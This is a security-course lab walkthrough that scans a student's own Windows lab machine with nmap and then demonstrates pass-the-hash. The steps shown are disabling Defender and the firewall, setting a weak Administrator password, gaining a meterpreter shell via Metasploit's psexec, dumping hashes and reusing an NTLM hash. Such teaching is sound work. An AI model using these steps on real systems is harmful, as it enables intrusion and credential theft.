![image](https://github.com/user-attachments/assets/068fae26-6e8f-402f-ad69-63a4e6a1f59e)

---

This is a lab from **John Strand**'s **Information Security Core Skills** Course:

https://www.antisyphontraining.com/product/information-security-core-skills-tm/

---

# Host Firewalls and Nmap

In this lab we will be scanning your **Windows** system from your **Linux** terminal with the firewall both on and off. 

The goal is to show you how a system is very different to the network with a firewall enabled. 

Remember, treat your internal network as hostile, because it is.

Let's get started by opening a command prompt terminal. You can do this by clicking the icon in the taskbar.


<img width="74" height="91" alt="Screenshot From 2026-02-07 17-59-56" src="https://github.com/user-attachments/assets/19ade57f-f3a3-4d2e-ad65-13251ee1cc35" />



From the command prompt we need to get the IP address of **your** Windows system:

```cmd
ipconfig
```

<img width="697" height="288" alt="2026-02-23_12-46" src="https://github.com/user-attachments/assets/83c711b6-fa49-4384-8aa5-f429f6724776" />

Please note your IP for **your** system. Mine is **"10.10.86.77"**. 

**Yours will be different.**

Let’s enable the Windows firewall:

```bash
netsh advfirewall set allprofiles state on
```


![](attachments/nmap_advfirewallon.png)

Let’s try and scan your Windows system from within a **Linux** terminal. Go ahead and open a **Linux** terminal up.


- **Double-click** `Ubuntu Shell` on Desktop

<img width="90" height="104" alt="Screenshot From 2026-02-23 10-28-37" src="https://github.com/user-attachments/assets/196f7867-877b-4a37-bc02-1214e50e96a5" />

In the **Linux** terminal, let’s become root:

```bash
sudo su -
```

Now, let’s rescan from the **Linux** terminal.

Run the scan: 

```bash
nmap 10.10.86.77
```

>[!IMPORTANT]
>Your IP will be different!!!!

Please note, you can just hit the up arrow key to view previously run commands.  

You can hit the spacebar to see status.

It should look like this:

<img width="604" height="443" alt="2026-02-23_12-50" src="https://github.com/user-attachments/assets/e3cfa5e0-5130-496f-bddc-bcf6c2853857" />

Please note the open ports. These are ports and services that an attacker could use to authenticate to your system or attack if an exploit is available. 

Now, using the same process as before, let’s disable the **Windows** firewall to go back to the base state:

```cmd
netsh advfirewall set allprofiles state off
```

<img width="620" height="463" alt="2026-02-23_13-04" src="https://github.com/user-attachments/assets/dc9909ed-8732-496b-8876-c20c19df8416" />

- As we can see, there is one more service shown open on port **5357** and also, the other **985** ports are shown as directly as **closed**, not **filtered**

---

Now, lets see why this is important with pass the hash.

First lets configure the Windows system

Let's disable AV.

- Open **Powershell**

<img width="74" height="91" alt="Screenshot From 2026-02-07 17-59-15" src="https://github.com/user-attachments/assets/4bb73f73-82e2-419d-8f70-4f57c21cb3bf" />

```ps
Set-MpPreference -DisableRealtimeMonitoring $true
```

Next, let's make sure that firewall is off.

```ps
netsh advfirewall set allprofiles state off
```

Now, let's set an easy password.  

```ps
net user Administrator password1234
```


It should look like this:

<img width="718" height="130" alt="2026-02-23_13-31" src="https://github.com/user-attachments/assets/0e82b469-9b03-43f6-a16d-9fab7c1ac38d" />

- Now get you **Windows IP**:

```ps
ipconfig
```

<img width="639" height="154" alt="Get_IpWIN" src="https://github.com/user-attachments/assets/ad0b348b-cc4f-40e3-9625-c9bbc42e3e0a" />


Now, let's open a Linux terminal:

- **Double-click** `Ubuntu Shell` on Desktop

<img width="90" height="104" alt="Screenshot From 2026-02-23 10-28-37" src="https://github.com/user-attachments/assets/196f7867-877b-4a37-bc02-1214e50e96a5" />



Become root:

```bash
sudo su -
```

Start Metasploit

```bash
msfconsole -q
```

<img width="577" height="91" alt="msfconsolebash" src="https://github.com/user-attachments/assets/7078dce4-0385-40fe-a7a5-6852d28a30bf" />


In another Linux terminal, get your IP address

```bash
ifconfig
```

<img width="716" height="175" alt="Get_IP" src="https://github.com/user-attachments/assets/cc1893c9-3a96-4ddb-a16a-45f0bdad0e10" />


msf6 > `use exploit/windows/smb/psexec`


msf6 exploit(windows/smb/psexec) > `set RHOST <Windows IP>`

msf6 exploit(windows/smb/psexec) > `set LHOST <Linux IP>`


msf6 exploit(windows/smb/psexec) > `set SMBUSER Administrator`

msf6 exploit(windows/smb/psexec) > `set SMBPASS password1234`

msf6 exploit(windows/smb/psexec) > `exploit`

It should look lie this:

<img width="947" height="377" alt="2026-02-23_13-46" src="https://github.com/user-attachments/assets/63165ac9-d530-48f4-bc56-665c17ace0d1" />


Now dump the password hashes:

meterpreter > `hashdump`

<img width="805" height="122" alt="1" src="https://github.com/user-attachments/assets/85a53c8e-5339-40fd-8a3c-316fec8b26bd" />

meterpreter > `exit -y`


msf6 exploit(windows/smb/psexec) > `set SMBPASS aad3b435b51404eeaad3b435b51404ee:d4a1be1776ad10df103812b1a923cde4`

msf6 exploit(windows/smb/psexec) > `exploit`

<img width="1030" height="445" alt="2" src="https://github.com/user-attachments/assets/f3801a66-0c9e-4087-b219-180ac2fd8564" />

Kill it


meterpreter > `exit -y`


***                                                                 
<b><i>Continuing the course? </br>[Next Lab](/IntroClassFiles/Tools/IntroClass/PasswordCracking/PasswordCracking.md)</i></b>

<b><i>Want to go back? </br>[Previous Lab](/IntroClassFiles/Tools/IntroClass/nessusIntroClass/Nessus.md)</i></b>

<b><i>Looking for a different lab? </br>[Lab Directory](/IntroClassFiles/navigation.md)</i></b>

***Finished with the Labs?***

Please be sure to destroy the lab environment!

[Click here for instructions on how to destroy the Lab Environment](/IntroClassFiles/Tools/IntroClass/LabDestruction/labdestruction.md)

---


















